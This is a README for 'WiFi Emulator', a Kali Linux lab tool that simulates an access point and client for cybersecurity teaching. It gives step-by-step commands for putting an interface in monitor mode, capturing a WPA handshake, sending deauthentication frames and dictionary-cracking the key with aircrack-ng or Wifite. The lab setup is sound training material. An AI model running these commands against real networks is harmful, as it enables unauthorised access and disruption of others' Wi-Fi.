# Intro
Welcome to WiFi Emulator!
Please let me know if you have any questions or suggestions.
Kaled Aljebur,

Please note: it is only been tested on Kali so far.

## To install, in Kali terminal
1. Install the package using `pipx install wifi-emulator`
2. Then run this command to install it as an app `wifi-emulator-setup`
3. Then you can start it from the applications menu in Kali, search for `WiFi Emulator`


Run the steps in the following order:
1. Generate Access Point Conf file
2. Edit ap.conf if needed
3. Generate Access Client Conf file
4. Edit client.conf if needed
5. Create Virtual Interfaces
6. Start Access Point on wlan0
7. Start Access Client on wlan1
8. (Optional) Run Wifite for capture/cracking

Other Buttons:
- Reset: Remove all virtual interfaces and temp files
- Close: Exit the application
- Status: Check the status of network interfaces, wlan0, and wlan1
- Help: Show this window

Clikc on `Open Root Terminal button`, then follow:
1.  Enable monitor mode on wlan2
    - `airmon-ng start wlan2`
    - This will change wlan2 into wlan2mon, use `ip a` to check
2.  Scan the avillable wireless networks
    - `airodump-ng wlan2mon`
3.  Start capturing the WPA hansshape from the targeted AP
    - `airodump-ng wlan2mon --bssid ce:7f:82:23:49:53 --channel 6 -w capture`
    - Change ce:7f:82:23:49:53 with wlan0 MAC address
    - If handshake captured, you will see `WPA handshake...` in the top right
4.  If no hsndshake captured, open new terminal tab, then try to de-auth
    - `aireplay-ng --deauth 3 -a ce:7f:82:23:49:53 wlan2mon`
    - Change ce:7f:82:23:49:53 with wlan0 or wlan1 MAC address
5.  Stop all commands when see WPA handshake captured,
    - all capturing files located in /var/log/wifi-emulator/capture
6.  Try dictionary attack to get the wifi key from the captured handshake
    - `aircrack-ng capture-01.cap -w /usr/share/dict/wordlist-probable.txt`

Or, clikc on `Open Root Terminal button`, type `wifite` then do:
- Select wlan2 as monitoring interface
- Select the Access Point CyberWifi
- Wifite will try to de-authentiate to ceapture the WPA handshake
- Little wait and you will see the cracked default key
- Wifite files are will be located in /var/log/wifi-emulator/capture
- Each time you run Wifite, /var/log/wifi-emulator/capture will be cleared

Note:
- Do not clock on "Generate..." after editing because your edit will be gone
- Ensure you run this tool with root (sudo)
- Use the status buttons to see the outputs
- All logs and Wifite cracking results will be saved in /var/log/wifi-emulator/

This application was created for educational and research purposes in 
cybersecurity teaching labs. The traffic generated between wlan0 and wlan1 is 
realistic and suitable for hands-on research.

# Install .deb in Kali
- To install:
    - Download [wifi-emulator.deb](https://github.com/kaledaljebur/wifi-emulator/blob/main/wifi-emulator.deb)
    - Use `sudo apt update && sudo apt install -y ~/Downloads/wifi-emulator.deb`
- To remove:
    - `sudo dpkg -r wifi-emulator`